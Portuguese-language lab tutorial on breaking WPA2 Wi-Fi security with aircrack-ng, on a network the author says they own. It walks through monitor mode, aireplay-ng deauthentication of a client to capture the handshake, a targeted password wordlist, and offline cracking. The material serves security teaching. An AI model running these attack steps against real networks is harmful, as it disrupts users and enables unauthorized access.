---
date: 2018-08-10
title: LAB WIFI - Quebrando WPA2
# Video em contrução
#video_id: _iH8f5alzWA

# Descrição
description: Aqui vou mostrar como podemos quebrar a segurança de redes Wifi protegidas com WPA2

# Categoria
categories:
  - wifi

#Arquivos a ser compartilhado
#resources:
#  - name: Source code
#    link: https://github.com/CloudCannon/creative-jekyll-theme/
#  - name: CloudCannon
#    link: https://cloudcannon.com
#type: Video

# Tipo de arquivo
type: Document

#set: getting-started
#set_order: 1

#Inicia POST
---

## O que vamos precisar?
- Roteador para atacar configurado com WPA2
- Um dispositivo para se conectar a rede
- Uma maquina para ataque usando aircrack-ng
- Adaptador wireless 
- Também podemos usar um notebook (No caso desse teste)

## Configurando nosso roteador
Nesse laboratório vou configurar um roteador com WPA2 e em seguida vamos quebrar a senha dele usando o arsenal do aircrack-ng.

## Logando o segundo dispositivo
Para simular uma rede vamos ter outro dispositivo além da maquina de ataque.

Podemos usar um celular para simular um usuário usando a rede.

## Na maquina de ataque
Na nossa maquina responsável pelo ataque vamos precisar de.

### Usando Linux Debian
Nesse caso eu estou usando o Debian Stretch.

- aircrack-ng (utilitários de "cracking" para redes sem fio WEP/WPA)
```sh
sudo apt-get install aircrack-ng
```
- net-tools (conjunto de ferramentas para rede NET-3)
```sh
sudo apt-get install net-tools
```

### Vamos ver nosso adaptador de rede
Podemos usar o **ifconfig** para nos auxiliar no reconhecimento do nosso adaptador de rede.

Precisamos de permissão de super usuário para usar o **ifconfig** , para isso usamos o **sudo**.
```sh
sudo ifconfig
```

![Verificando adaptador](https://abase.greenmindlabs.com/images/wifi/Quebrando-redes-WPA2/lab-wifi-01.png)


Nesse caso a minha está com o nome **wlp2s0**.

Sabendo isso podemos ir para o próximo passo.

> Podemos usar tambem o **iwconfig**(iw - ferramenta para configuração de dispositivos sem fio no Linux).
```sh
sudo iwconfig
```

### Vamos iniciar modo monitor
Antes de iniciar o **modo monitor** vamos checar os processos a fim de interromper possíveis conflitos.
```sh
airmon-ng check kill
```

![Checar os processos e interrompendo](https://abase.greenmindlabs.com/images/wifi/Quebrando-redes-WPA2/lab-wifi-02.png)

Vamos iniciar o modo monitor
```sh
airmon-ng start wlp2s0
```

![Iniciando modo monitor](https://abase.greenmindlabs.com/images/wifi/Quebrando-redes-WPA2/lab-wifi-03.png)

Podemos verificar nosso adaptador novamente usando o **ifconfig**.
```sh
sudo ifconfig
```

![Verificando adaptadores](https://abase.greenmindlabs.com/images/wifi/Quebrando-redes-WPA2/lab-wifi-04.png)

Agora apareceu a rede **wlp2s0mon** , vamos precisar disso para o próximo passo.

### Iniciando modo monitor
Podemos iniciar o modo monitor da seguinte forma.
```sh
sudo airodump-ng wlp2s0mon
```

Assim que for dado o comando ele vai começar buscar por redes , podemos ver que vai ser encontrado a rede **emporiolife**.

Essa rede é a nossa rede de testes e nosso laboratório.

Em outras aulas vamos usar esse domínios para realizar alguns ataques , já que esse domínio é de minha propriedade e todos os laboratórios serão realizados de forma controlada.

Podemos ver a rede **emporiolife** , precisamos prestar atenção em alguns pontos.

![Escolhendo alvo](https://abase.greenmindlabs.com/images/wifi/Quebrando-redes-WPA2/lab-wifi-05.png)


São eles
- BSSID (18:D6:C7:D2:D3:CC)
- CH  (8)

Agora que já sabemos isso podemos cancelar apertando um **Ctrl+c**.

### Filtrando alvo e salvando em arquivo
Agora que já sabemos a nossa rede alvo vamos filtrar ela e salvar todo o dump em um arquivo.

Nesse exemplo vou chamar o arquivo de **emporiolife**.

Precisamos ver 
- -c (canal usado)
- --bssid (Nome da nossa rede)
- -w (arquivo de saída)
E por fim a nossa rede.

```sh
airodump-ng -c 8 --bssid 18:D6:C7:D2:D3:CC -w emporiolife wlp2s0mon
```

### Captura do handshake
Agora tudo o que precisamos é um cliente se conectar na rede para **pegar o handshake** , agora é a hora que o segundo dispositivo entra em ação , esse dispositivo que falamos no começo para simular um usuário real na rede.

Só que não temos tempo para esperar até ele se conectar , para isso vamos derrubar ele.

### Forçando a captura do handshake
Agora que o **airodump-ng** ta rodando e salvando tudo em um arquivo vamos precisar pegar o **handshake**.

Podemos forçar isso da seguinte forma.


![Capturando handshake](https://abase.greenmindlabs.com/images/wifi/Quebrando-redes-WPA2/lab-wifi-06.png)

### Realizando deauth usando aireplay-ng 
O **aireplay-ng** é uma ferramenta muito interessante , ela pode nos auxiliar em diversas coisas.

Podemos ver as opções usando
```sh
sudo aireplay-ng --help
```

Vamos usar a opção **--deauth** , vamos usar tambem o contador **count**. (Vamos ver mais sobre ela em outro tutorial.)

Vamos montar nosso ataque para desautenticação , vamos usar

- deauth (enviar 5 pacotes de desautenticação)
- -a (para passar o MAC)
- -c (18:D6:C7:D2:D3:CC)

```sh
sudo aireplay-ng --deauth 5 -a 18:D6:C7:D2:D3:CC -c AC:D0:74:20:CB:20 wlp2s0mon
```

![Desautenticação](https://abase.greenmindlabs.com/images/wifi/Quebrando-redes-WPA2/lab-wifi-07.png)


Após realizar o ataque de dasautenticação podemos ver o **airodump-ng** e checar se apareceu no canto superior direito a mensagem. **WPA handshake: 18:D6:C7:D2:D3:CC**.

Veja na imagem a baixo
![WPA handshake](https://abase.greenmindlabs.com/images/wifi/Quebrando-redes-WPA2/lab-wifi-08.png)


Podemos fechar o **airodump-ng**.

### Analisando arquivos gerados
Vamos listar os arquivos gerados , podemos dar um **ls** para listar o diretório.

Veja a imagem a baixo.
![Arquivos obtidos](https://abase.greenmindlabs.com/images/wifi/Quebrando-redes-WPA2/lab-wifi-09.png)


Podemos ver os arquivos com o nome **emporiolife**.
- emporiolife-01.cap
- emporiolife-01.csv
- emporiolife-01.kismet.csv
- emporiolife-01.kismet.netxml

### Realizando brute force 
Vamos agora precisar de uma wordlist , baseada nessa wordlist que a senha será quebrada e se a senha não estiver nessa wordlist ela não sera quebrada.

Para realizar esse teste podemos criar uma wordlist para testes , mais poderíamos usar outros dicionários de senhas.

Vou criar o dicionario chamado **alvo-emporiolife.txt** com possíveis senhas do alvo.
```sh
emporio
life
emporiolife
emporiolifewifi
wificlientes
wififuncionarios
wifi2018
wifipassword
emporiolife@123
emporiolife2018
emporiolife@2018
lifeemporio
senha2018
12345senha
```
Futuramente vou explicar como criar wordlists personalizadas usando o **crunch**.

Vamos precisar do arquivo **.cap** que conseguimos anteriormente e do **aircrack-ng**.

Vamos usar o
- -w (seguido da wordlist)

Como a wordlist e o arquivo .cap estão no mesmo diretório eu não precisei passar o caminho inteiro.
```sh
sudo aircrack-ng  emporiolife-01.cap -w alvo-emporiolife.txt
```


![Senha obtida com o aircrack-ng](https://abase.greenmindlabs.com/images/wifi/Quebrando-redes-WPA2/lab-wifi-10.png)


